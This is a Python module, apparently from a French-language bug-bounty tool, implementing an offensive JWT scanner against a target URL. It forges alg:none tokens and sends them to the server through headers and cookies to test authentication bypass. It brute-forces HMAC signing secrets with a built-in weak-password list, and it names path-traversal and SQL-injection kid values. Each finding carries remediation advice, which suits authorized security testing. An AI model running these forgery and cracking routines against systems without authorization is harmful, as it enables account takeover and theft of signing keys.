"""Analyse et attaques JWT pour WebBounty."""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
from pathlib import Path
from typing import Any

import requests

from .utils import Finding, get_base_url, normalize_url, safe_request

# Secrets faibles courants pour brute-force HMAC
DEFAULT_SECRETS = [
    "secret", "password", "123456", "admin", "key", "jwt_secret",
    "changeme", "supersecret", "your-256-bit-secret", "your-secret-key",
    "HS256", "test", "dev", "production", "staging", "null", "none",
    "qwerty", "letmein", "welcome", "monkey", "dragon", "master",
    "football", "shadow", "sunshine", "princess", "access", "login",
    "passw0rd", "default", "private", "public", "token", "auth",
    "mysecret", "s3cr3t", "hunter2", "bugbounty", "bountystrike",
]


def _b64_decode(data: str) -> bytes:
    padding = 4 - len(data) % 4
    if padding != 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data)


def decode_jwt(token: str) -> dict[str, Any] | None:
    """Décode un JWT sans vérification."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64_decode(parts[0]))
        payload = json.loads(_b64_decode(parts[1]))
        return {"header": header, "payload": payload, "signature": parts[2], "raw": token}
    except (json.JSONDecodeError, ValueError, UnicodeDecodeError):
        return None


def extract_jwts_from_text(text: str) -> list[str]:
    """Extrait les JWT depuis du texte (cookies, HTML, JS)."""
    pattern = r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}"
    return list(set(re.findall(pattern, text)))


def crack_hs256(token: str, secrets: list[str]) -> str | None:
    """Tente de casser un JWT HS256/HS384/HS512 via brute-force."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    header_b64, payload_b64, sig_b64 = parts
    signing_input = f"{header_b64}.{payload_b64}".encode()

    try:
        expected_sig = _b64_decode(sig_b64)
    except ValueError:
        return None

    for secret in secrets:
        for algo in (hashlib.sha256, hashlib.sha384, hashlib.sha512):
            computed = hmac.new(secret.encode(), signing_input, algo).digest()
            if hmac.compare_digest(computed, expected_sig):
                return secret
    return None


def build_alg_none_token(token: str) -> str | None:
    """Construit un token alg:none pour test."""
    decoded = decode_jwt(token)
    if not decoded:
        return None
    header = decoded["header"].copy()
    header["alg"] = "none"
    header_b64 = base64.urlsafe_b64encode(
        json.dumps(header, separators=(",", ":")).encode()
    ).rstrip(b"=").decode()
    payload_b64 = token.split(".")[1]
    return f"{header_b64}.{payload_b64}."


class JWTScanner:
    """Scanner JWT — extraction, analyse et tests offensifs."""

    def __init__(
        self,
        target: str,
        session: requests.Session,
        wordlist_dir: Path | None = None,
    ):
        self.target = normalize_url(target)
        self.base_url = get_base_url(self.target)
        self.session = session
        self.wordlist_dir = wordlist_dir or Path(__file__).parent.parent / "wordlists"
        self.findings: list[Finding] = []
        self.tokens: list[dict[str, Any]] = []

    def run_full_scan(self) -> list[Finding]:
        """Lance tous les tests JWT."""
        self._extract_tokens()
        for token_data in self.tokens:
            self._analyze_token(token_data)
            self._test_alg_none(token_data)
            self._crack_secret(token_data)
            self._check_sensitive_claims(token_data)
        return self.findings

    def _extract_tokens(self) -> None:
        """Extrait les JWT des cookies, headers et corps de réponse."""
        resp = safe_request(self.session, "GET", self.target)
        if not resp:
            return

        sources: list[tuple[str, str]] = [("response_body", resp.text)]

        for cookie in self.session.cookies:
            sources.append((f"cookie:{cookie.name}", cookie.value))

        set_cookie = resp.headers.get("Set-Cookie", "")
        if set_cookie:
            sources.append(("set-cookie", set_cookie))

        auth = resp.headers.get("Authorization", "")
        if auth:
            sources.append(("authorization", auth))

        for source, text in sources:
            for token in extract_jwts_from_text(text):
                decoded = decode_jwt(token)
                if decoded and not any(t["raw"] == token for t in self.tokens):
                    self.tokens.append({**decoded, "source": source})
                    self.findings.append(
                        Finding(
                            title="JWT découvert",
                            severity="info",
                            category="JWT",
                            url=self.target,
                            description=f"Token JWT trouvé dans {source}",
                            evidence=f"Header: {json.dumps(decoded['header'])[:200]}",
                        )
                    )

    def _analyze_token(self, token_data: dict[str, Any]) -> None:
        """Analyse la structure et les faiblesses du JWT."""
        header = token_data["header"]
        payload = token_data["payload"]
        alg = header.get("alg", "unknown")

        if alg.lower() in ("none", "null"):
            self.findings.append(
                Finding(
                    title="JWT avec algorithme 'none'",
                    severity="critical",
                    category="JWT",
                    url=self.target,
                    description="Le token utilise alg:none — signature désactivée",
                    evidence=json.dumps(header),
                    remediation="Rejeter les tokens alg:none côté serveur",
                )
            )

        if alg.upper().startswith("HS") and header.get("jku"):
            self.findings.append(
                Finding(
                    title="JWT avec header jku (JWKS injection)",
                    severity="high",
                    category="JWT",
                    url=self.target,
                    description="Header jku présent — risque d'injection de clé publique",
                    evidence=json.dumps(header),
                    remediation="Valider l'URL jku contre une whitelist",
                )
            )

        if header.get("kid"):
            kid = header["kid"]
            dangerous_kids = ["../../../../dev/null", "/dev/null", "' OR '1'='1", "../../etc/passwd"]
            if any(d in str(kid) for d in dangerous_kids) or ".." in str(kid):
                self.findings.append(
                    Finding(
                        title="JWT kid suspect",
                        severity="high",
                        category="JWT",
                        url=self.target,
                        description=f"Header kid potentiellement exploitable: {kid}",
                        evidence=json.dumps(header),
                        remediation="Sanitiser le header kid",
                    )
                )

        if alg.upper() == "RS256" and header.get("alg") == "HS256":
            self.findings.append(
                Finding(
                    title="JWT algorithm confusion (RS256→HS256)",
                    severity="critical",
                    category="JWT",
                    url=self.target,
                    description="Possibilité d'attaque algorithm confusion",
                    evidence=json.dumps(header),
                    remediation="Forcer la vérification de l'algorithme côté serveur",
                )
            )

        # Vérifier expiration
        import time
        exp = payload.get("exp")
        if exp and exp < time.time():
            self.findings.append(
                Finding(
                    title="JWT expiré accepté",
                    severity="medium",
                    category="JWT",
                    url=self.target,
                    description="Token expiré toujours présent/actif",
                    evidence=f"exp={exp}",
                )
            )

    def _test_alg_none(self, token_data: dict[str, Any]) -> None:
        """Teste si le serveur accepte alg:none."""
        none_token = build_alg_none_token(token_data["raw"])
        if not none_token:
            return

        # Tester sur Authorization header
        resp = safe_request(
            self.session,
            "GET",
            self.target,
            headers={"Authorization": f"Bearer {none_token}"},
        )
        if resp and resp.status_code == 200:
            self.findings.append(
                Finding(
                    title="JWT alg:none accepté par le serveur",
                    severity="critical",
                    category="JWT",
                    url=self.target,
                    description="Le serveur accepte un token modifié avec alg:none",
                    evidence=none_token[:100] + "...",
                    remediation="Rejeter explicitement alg:none et tokens sans signature",
                )
            )

        # Tester sur cookie
        for cookie in self.session.cookies:
            resp = safe_request(
                self.session,
                "GET",
                self.target,
                cookies={cookie.name: none_token},
            )
            if resp and resp.status_code == 200 and "unauthorized" not in resp.text.lower():
                self.findings.append(
                    Finding(
                        title=f"JWT alg:none accepté via cookie '{cookie.name}'",
                        severity="critical",
                        category="JWT",
                        url=self.target,
                        description="Bypass d'authentification via alg:none",
                        evidence=f"Cookie: {cookie.name}",
                        remediation="Valider strictement l'algorithme et la signature",
                    )
                )

    def _crack_secret(self, token_data: dict[str, Any]) -> None:
        """Brute-force du secret HMAC."""
        alg = token_data["header"].get("alg", "").upper()
        if not alg.startswith("HS"):
            return

        secrets = list(DEFAULT_SECRETS)
        secrets_path = self.wordlist_dir / "jwt_secrets.txt"
        if secrets_path.exists():
            secrets.extend(
                w.strip()
                for w in secrets_path.read_text(encoding="utf-8").splitlines()
                if w.strip() and not w.startswith("#")
            )

        found = crack_hs256(token_data["raw"], secrets)
        if found:
            self.findings.append(
                Finding(
                    title="Secret JWT faible trouvé",
                    severity="critical",
                    category="JWT",
                    url=self.target,
                    description=f"Secret HMAC cracké: '{found}'",
                    evidence=f"alg={alg}, secret={found}",
                    remediation="Utiliser un secret cryptographiquement fort (256+ bits)",
                )
            )

    def _check_sensitive_claims(self, token_data: dict[str, Any]) -> None:
        """Vérifie les claims sensibles dans le payload."""
        payload = token_data["payload"]
        sensitive_keys = ["password", "secret", "api_key", "private_key", "ssn", "credit_card"]
        found_sensitive = [k for k in payload if any(s in k.lower() for s in sensitive_keys)]

        if found_sensitive:
            self.findings.append(
                Finding(
                    title="Données sensibles dans le payload JWT",
                    severity="high",
                    category="JWT",
                    url=self.target,
                    description=f"Claims sensibles exposés: {found_sensitive}",
                    evidence=json.dumps({k: payload[k] for k in found_sensitive})[:300],
                    remediation="Ne jamais stocker de données sensibles dans un JWT",
                )
            )

        # Privilege escalation via claims modifiables
        role_keys = ["role", "roles", "admin", "is_admin", "isAdmin", "privilege", "permissions", "group"]
        for key in role_keys:
            if key in payload:
                self.findings.append(
                    Finding(
                        title=f"Claim de privilège modifiable: '{key}'",
                        severity="medium",
                        category="JWT",
                        url=self.target,
                        description=f"Claim '{key}'={payload[key]} — tester la modification",
                        evidence=json.dumps({key: payload[key]}),
                        remediation="Ne pas faire confiance aux claims côté client, valider côté serveur",
                    )
                )
